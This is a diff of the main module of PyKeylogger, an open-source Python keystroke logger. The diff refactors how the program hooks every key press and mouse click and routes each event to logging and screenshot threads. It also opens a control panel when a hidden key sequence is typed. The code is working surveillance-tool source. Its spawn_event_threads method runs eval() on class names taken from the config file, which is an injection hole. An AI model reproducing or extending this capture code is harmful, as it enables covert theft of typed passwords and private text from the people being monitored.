@@ -1,7 +1,7 @@
 ##############################################################################
 ##
 ## PyKeylogger: Simple Python Keylogger for Windows
-## Copyright (C) 2007  nanotube@users.sf.net
+## Copyright (C) 2009  nanotube@users.sf.net
 ##
 ## http://pykeylogger.sourceforge.net/
 ##
@@ -37,19 +37,22 @@ else:
 import re
 from optparse import OptionParser
 import traceback
-from logwriter import LogWriter
-from imagecapture import ImageWriter
 import version
 #import ConfigParser
-from configobj import ConfigObj
+from configobj import ConfigObj, flatten_errors
 from validate import Validator
 from controlpanel import PyKeyloggerControlPanel
 from supportscreen import SupportScreen, ExpirationScreen
 import Tkinter, tkMessageBox
 import myutils
-import Queue
-from Queue import Empty # to avoid some weird exceptions on exit
+from Queue import Empty, Queue
 import threading
+import logging
+from myutils import _settings, _cmdoptions, _mainapp
+
+# event processing threads
+from detailedlogwriter import DetailedLogWriterFirstStage
+from onclickimagecapture import OnClickImageCaptureFirstStage
 
 class KeyLogger:
     '''Captures all keystrokes, enqueue events.
@@ -59,23 +62,22 @@ class KeyLogger:
        
        '''
     def __init__(self):
-        self.ParseOptions() # stored in self.cmdoptions
-        self.ParseConfigFile() # stored in self.settings
-        self.ParseControlKey()
+        self.parse_options() # stored in self.cmdoptions
+        self.parse_config_file() # stored in self.settings
+        self.parse_control_key()
         self.NagscreenLogic()
         self.process_settings()
-        self.q_logwriter = Queue.Queue(0)
-        self.q_imagewriter = Queue.Queue(0)
-        self.lw = LogWriter(self.settings,
-                            self.cmdoptions,
-                            self.q_logwriter)
-        self.iw = ImageWriter(self.settings,
-                              self.cmdoptions,
-                              self.q_imagewriter)
+        _settings['settings'] = self.settings
+        _cmdoptions['cmdoptions'] = self.cmdoptions
+        _mainapp['mainapp'] = self
+        
+        self.create_log_directory(self.settings['General']['Log Directory'])
+        os.chdir(self.settings['General']['Log Directory'])
+        self.create_loggers()
+        self.spawn_event_threads()
+        
         if os.name == 'posix':
-            self.hashchecker = ControlKeyMonitor(self.cmdoptions,
-                                                 self.lw,
-                                                 self,
+            self.hashchecker = ControlKeyMonitor(self,
                                                  self.ControlKeyHash)
         self.hm = hooklib.HookManager()
         
@@ -84,7 +86,7 @@ class KeyLogger:
             self.hm.KeyDown = self.OnKeyDownEvent
             self.hm.KeyUp = self.OnKeyUpEvent
         
-        if self.settings['Image Capture']['Capture Clicks'] == True:
+        if self.settings['General']['Hook Mouse'] == True:
             self.hm.HookMouse()
             self.hm.MouseAllButtonsDown = self.OnMouseDownEvent
         
@@ -93,10 +95,35 @@ class KeyLogger:
         
         #if self.options.hookMouse == True:
         #   self.hm.HookMouse()
-
+    
+    def spawn_event_threads(self):
+        self.event_threads = {}
+        self.queues = {}
+        self.logger.debug(self.settings.sections)
+        for section in self.settings.sections:
+            try:
+                threadname = self.settings[section]['General']['_Thread_Class']
+                self.queues[section] = Queue(0)
+                self.event_threads[section] = \
+                    eval(self.settings[section]['General']['_Thread_Class'] + \
+                    '(self.queues[section], section)')
+            except KeyError:
+                self.logger.debug('not creating thread for section %s' % \
+                                        section, exc_info=True)
+                pass # this is not a thread to be started.
+    
     def start(self):
-        self.lw.start()
-        self.iw.start()
+        #self.lw.start()
+        #self.iw.start()
+        for key in self.event_threads.keys():
+            if self.settings[key]['General']['Enable ' + key]:
+                self.logger.debug('Starting thread %s: %s' % \
+                                (key, self.event_threads[key]))
+                self.event_threads[key].start()
+            else:
+                self.logger.debug('Not starting thread %s: %s' % \
+                                (key, self.event_threads[key]))
+        
         if os.name == 'nt':
             pythoncom.PumpMessages()
         if os.name == 'posix':
@@ -112,7 +139,7 @@ class KeyLogger:
            
            '''
         log_dir = os.path.normpath(self.settings['General']['Log Directory'])
-        if os.path.isabs(self.settings['General']['Log Directory']):
+        if os.path.isabs(log_dir):
             self.settings['General']['Log Directory'] = log_dir
         else:
             self.settings['General']['Log Directory'] = \
@@ -120,17 +147,63 @@ class KeyLogger:
         
         # Regexp filter for the non-allowed characters in windows filenames.
         self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")
-        self.settings['General']['Log File'] = \
-           self.filter.sub(r'__',self.settings['General']['Log File'])
+        
         self.settings['General']['System Log'] = \
            self.filter.sub(r'__',self.settings['General']['System Log'])
-        
-        # todo: also want to run imagesdirectoryname (tbc) through self.filter 
-        
-    def ParseControlKey(self):
+    
+    def create_log_directory(self, logdir):
+        '''Make sure we have the directory where we want to log'''
+        try:
+            os.makedirs(logdir)
+        except OSError, detail:
+            if(detail.errno==17):  #if directory already exists, swallow the error
+                pass
+            else:
+                logging.getLogger('').error("error creating log directory", 
+                        exc_info=True)
+        except:
+            logging.getLogger('').error("error creating log directory", 
+                        exc_info=True)
+    
+    def parse_control_key(self):
         self.ControlKeyHash = \
            ControlKeyHash(self.settings['General']['Control Key'])
+    
+    def create_loggers(self):
+    
+        # configure default root logger to log all debug messages to stdout
+        if self.cmdoptions.debug:
+            loglevel = logging.DEBUG
+        else:
+            loglevel = logging.CRITICAL
         
+        logformatter = logging.Formatter("%(asctime)s %(name)-25s "
+                "%(levelname)-10s %(filename)-25s %(lineno)-5d "
+                "%(funcName)s %(message)s")
+        rootlogger = logging.getLogger('')
+        rootlogger.setLevel(logging.DEBUG)
+        consolehandler = logging.StreamHandler(sys.stdout)
+        consolehandler.setLevel(loglevel)
+        consolehandler.setFormatter(logformatter)
+        rootlogger.addHandler(consolehandler)
+        
+        # configure the "systemlog" handler to log all debug messages to file
+        if self.settings['General']['System Log'] != 'None':
+            systemlogpath = os.path.join(
+                    self.settings['General']['Log Directory'], 
+                    self.settings['General']['System Log'])
+            systemloghandler = logging.FileHandler(systemlogpath)
+            systemloghandler.setLevel(logging.DEBUG)
+            systemloghandler.setFormatter(logformatter)
+            rootlogger.addHandler(systemloghandler)
+            
+        self.logger = rootlogger
+    
+    def push_event_to_queues(self, event):
+        for key in self.queues.keys():
+            self.logger.debug('Sticking event into queue %s' % key)
+            self.queues[key].put(event)
+    
     def OnKeyDownEvent(self, event):
         '''Called when a key is pressed.
         
@@ -138,12 +211,13 @@ class KeyLogger:
            and passes the event on to the system.
            
            '''
-        self.q_logwriter.put(event)
+        self.push_event_to_queues(event)
         
         self.ControlKeyHash.update(event)
         
         if self.cmdoptions.debug:
-                self.lw.PrintDebug("control key status: " + str(self.ControlKeyHash))
+            logging.getLogger('').debug("control key status: " + \
+                    str(self.ControlKeyHash))
                 
         # We have to open the panel from main thread on windows, otherwise it
         # hangs. This is possibly due to some interaction with the python
@@ -154,10 +228,10 @@ class KeyLogger:
         if os.name == 'nt':
             if self.ControlKeyHash.check():
                 if not self.panel:
-                    self.lw.PrintDebug("starting panel")
+                    logging.getLogger('').debug("starting panel")
                     self.panel = True
                     self.ControlKeyHash.reset()
-                    PyKeyloggerControlPanel(self.cmdoptions, self)
+                    PyKeyloggerControlPanel()
         return True
     
     def OnKeyUpEvent(self,event):
@@ -165,7 +239,7 @@ class KeyLogger:
         return True
     
     def OnMouseDownEvent(self,event):
-        self.q_imagewriter.put(event)
+        self.push_event_to_queues(event)
         return True
     
     def stop(self):
@@ -173,13 +247,16 @@ class KeyLogger:
         if os.name == 'posix':
             self.hm.cancel()
             self.hashchecker.cancel()
-        self.lw.cancel()
-        self.iw.cancel()
+        
+        for key in self.event_threads.keys():
+            self.event_threads[key].cancel()
         
         #print threading.enumerate()
+        logging.shutdown()
+        time.sleep(0.2) # give all threads time to clean up
         sys.exit()
     
-    def ParseOptions(self):
+    def parse_options(self):
         '''Read command line options.'''
         version_str = version.description + " version " + version.version + \
                       " (" + version.url + ")."
@@ -202,7 +279,7 @@ class KeyLogger:
         
         self.cmdoptions, args = parser.parse_args()
     
-    def ParseConfigFile(self):
+    def parse_config_file(self):
         '''Reads config file options from .ini file.
         
            Filename as specified by "--configfile" option,
@@ -228,23 +305,28 @@ class KeyLogger:
                                   list_values=False)
 
         # validate the config file
-        errortext = "Some of your input contains errors. " + \
-                    "Detailed error output below.\n\n"
-        val = Validator()
-        valresult = self.settings.validate(val, preserve_errors=True)
-        error_tpl = "Error in item \"%s\": %s\n"
-        if valresult != True:
-            for section in valresult.keys():
-                if valresult[section] != True:
-                    sectionval = valresult[section]
-                    for key in sectionval.keys():
-                        if sectionval[key] != True:
-                            errortext += error_tpl % \
-                               (str(key), str(sectionval[key]))
-            tkMessageBox.showerror("Errors in config file. Exiting.",
-                                   errortext)
-            sys.exit()
+        errortext=["Some of your input contains errors. "
+                    "Detailed error output below.",]
         
+        val = Validator()
+        val.functions['log_filename_check'] = myutils.validate_log_filename
+        val.functions['image_filename_check'] = myutils.validate_image_filename
+        valresult=self.settings.validate(val, preserve_errors=True)
+        if valresult != True:
+            for section_list, key, error in flatten_errors(self.settings, 
+                                                                valresult):
+                if key is not None:
+                    section_list.append(key)
+                else:
+                    section_list.append('[missing section]')
+                section_string = ','.join(section_list)
+                if error == False:
+                    error = 'Missing value or section.'
+                errortext.append('%s: %s' % (section_string, error))
+            tkMessageBox.showerror("Errors in config file. Exiting.", 
+                        '\n\n'.join(errortext))
+            sys.exit(1)
+
     def NagscreenLogic(self):
         '''Show the nagscreen (or not).'''
         
@@ -261,27 +343,27 @@ class KeyLogger:
         if NagMe == True:
             # first, show the support screen
             root = Tkinter.Tk()
-            root.geometry("100x100+200+200")
-            warn = SupportScreen(root, title="Please Support PyKeylogger",
-                                 rootx_offset=-20, rooty_offset=-35)
+            #root.geometry("100x100+200+200")
+            root.withdraw()
+            warn = SupportScreen(root, title="Please Support PyKeylogger")
             root.destroy()
             del(warn)
             
             # set the timer if first use
-            utfnd = self.settings['General']['Usage Time Flag NoDisplay']
+            utfnd = self.settings['General']['_Usage Time Flag']
             if myutils.password_recover(utfnd) == "firstuse":
-                self.settings['General']['Usage Time Flag NoDisplay'] = \
+                self.settings['General']['_Usage Time Flag'] = \
                    myutils.password_obfuscate(str(time.time()))
                 self.settings.write()
             
             # then, see if we have "expired"
-            utfnd = self.settings['General']['Usage Time Flag NoDisplay']
+            utfnd = self.settings['General']['_Usage Time Flag']
             if abs(time.time() - float(myutils.password_recover(utfnd))) > \
                3600 * 24 * 4:
                 root = Tkinter.Tk()
-                root.geometry("100x100+200+200")
-                warn = ExpirationScreen(root, title="PyKeylogger Has Expired",
-                                        rootx_offset=-20, rooty_offset=-35)
+                #root.geometry("100x100+200+200")
+                root.withdraw()
+                warn = ExpirationScreen(root, title="PyKeylogger Has Expired")
                 root.destroy()
                 del(warn)
                 sys.exit()
@@ -369,7 +451,7 @@ class ControlKeyMonitor(threading.Thread):
        Brings up control panel if it has.
        
        '''
-    def __init__(self, cmdoptions, logwriter, mainapp, controlkeyhash):
+    def __init__(self, mainapp, controlkeyhash):
         threading.Thread.__init__(self)
         self.finished = threading.Event()
         
@@ -377,19 +459,16 @@ class ControlKeyMonitor(threading.Thread):
         # this way we don't start a second panel instance when it's already up
         #self.panel=False
         
-        self.lw = logwriter
         self.mainapp = mainapp
-        self.cmdoptions = cmdoptions
         self.ControlKeyHash = controlkeyhash
         
     def run(self):
         while not self.finished.isSet():
             if self.ControlKeyHash.check():
                 if not self.mainapp.panel:
-                    self.lw.PrintDebug("starting panel")
                     self.mainapp.panel = True
                     self.ControlKeyHash.reset()
-                    PyKeyloggerControlPanel(self.cmdoptions, self.mainapp)
+                    PyKeyloggerControlPanel()
             time.sleep(0.05)
         
     def cancel(self):
